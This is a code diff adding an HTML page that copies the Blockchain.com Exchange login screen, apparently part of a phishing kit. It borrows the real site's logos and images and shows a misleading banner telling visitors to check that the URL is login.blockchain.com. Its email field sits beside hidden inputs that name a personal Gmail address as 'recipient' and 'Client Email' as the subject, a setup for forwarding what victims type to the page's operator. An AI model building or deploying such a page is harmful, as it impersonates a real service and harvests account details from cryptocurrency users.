@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/4c4cf0b696.js" crossorigin="anonymous"></script>
+        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/login.css">
+
+    <style>
+        /* CSS styles for the head section */
+        header {
+            background: url("https://altcoinsbox.com/wp-content/uploads/2023/01/blockchain.com-logo.svg") no-repeat center center fixed;
+            background-size: cover;
+            height: 200px; /* Adjust the height as needed */
+            /* Additional styling if necessary */
+        }
+    </style>
+</head>
+<body style="background-color: rgb(14, 18, 27);">
+    <section class="blockchain_" style="background-color: rgb(14, 18, 27);">
+        <div class="top_link"  style="background: rgb(12, 108, 242); color: rgb(255, 255, 255); text-align: center;"><p>For you security, make sure the URL is <i class="ri-lock-fill"></i> <a style="color: rgb(255, 255, 255);" href="login.html">https://login.blockchain.com</a> </p></div>
+        <div class="blockchain_logo" style="justify-content: center; color: rgb(251, 250, 249); background-color: rgb(14, 18, 27); display: flex; background-image: url('https://login.blockchain.com/img/bg-pattern.svg');">
+            <!-- <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/blockchain.com-logo.svg" alt="" style="width: 2%; height: 3%;"> <h3>Blockchain.com</h3> -->
+            <img src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd" alt="">
+         </div>
+        <div class="login_cont">
+            <div class="login_block" style="background-color: white;">
+                <div class="login_links">
+                    <a href="/" style="text-decoration: none;">
+                        <div class="icon1" style="background-color: rgb(243, 243, 243); display: flex; justify-content : center; border-radius: 8px 0px 0px 0px;">
+                            <img src="https://login.blockchain.com/img/wallet-grayscale.svg?342a7ebc07" alt="">
+                            <h5 style="color: rgb(152, 161, 179); padding-left: 3%;">Wallet</h5>
+                        </div>
+                    </a>
+                    <a href="/email" style="text-decoration: none;">
+                        <div class="icon1" style="display: flex; justify-content: center;">
+                            
+                            <img src="https://login.blockchain.com/img/exchange-no-background.svg?3e9e242226" alt="">
+                            <h5 style="color: rgb(12, 108, 242); padding-left: 3%;">Exchange</h5>
+                        </div>
+                    </a>
+                </div>
+                <form action="" style="display: grid; position: relative;">
+                    <div class="content" style="display: grid; border-color: none;">
+                        <div style="display: flex; justify-content: space-between;">
+                            <label for="email">Email</label>
+                            <p id="req" style="display: none; color: rgb(217, 59, 48);
+                            ">required</p>
+                        </div>
+                        <input id="myInput recipient" class="email_in" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                        <input id="myInput suject" class="email_in" value="Client Email" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                        <input id="myInput message" class="email_in" type="text" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                    </div>
+                    <div class="content" style="border-color: none;">
+                        <input type="submit" value="Continue" style="width: 100%;">
+                        
+                    </div>
+                    <script>
+                        // JavaScript to change text color on input click
+                        document.addEventListener('DOMContentLoaded', function () {
+                          var myInput = document.getElementById('myInput');
+                          var labelText = document.querySelector('#req');
+                    
+                          myInput.addEventListener('focus', function () {
+                            labelText.classList.add('highlighted-text');
+                          });
+                    
+                          myInput.addEventListener('blur', function () {
+                            labelText.classList.remove('highlighted-text');
+                          });
+                        });
+                      </script>
+                </form>
+                <div class="blc_act" style="text-align: center; font-weight: 500; font-size: 16px; line-height: inherit; text-transform: none; font-style: normal; color: rgb(103, 113, 132); padding: 4% 15% 2% 15%;"> <p>Don't have a Blockchain Account? <a href="#" style="text-decoration: none; color: rgb(12, 108, 242); font-weight: 600; font-size: 16px; line-height: inherit;">Sign up Now <i class="ri-arrow-right-line"></i></a></p></div>
+            </div>
+        </div>
+        <footer style="padding-top: 0px; font-weight: bold;">
+            <div class="" style="display: flex; color:rgba(194, 194, 196, 0.764); justify-content: center;">
+                <div style="padding: 0.5rem; bottom: 0rem; position: relative;">
+                    <select class="" aria-label="Default select example" name="state" style="background: none; border: none; color:rgba(194, 194, 196, 0.764); font-weight: 500;">
+                        <option class="select1">English</option>
+                        <option value="1">Español</option>
+                        <option value="2">Français</option>
+                        <option value="3">Português</option>
+                        <option value="3">Русский</option>
+                    </select>
+                    <style>
+                        select:hover{
+                            border: none;
+                        }
+                    </style>
+                </div>
+                <div style="padding: 0.5rem;"><p>Version 4.94.19</p></div>
+                <div style="padding: 0.5rem;"><p>Need Help?</p></div>
+            </div>
+        </footer>
+    </section>
+</body>
+</html>
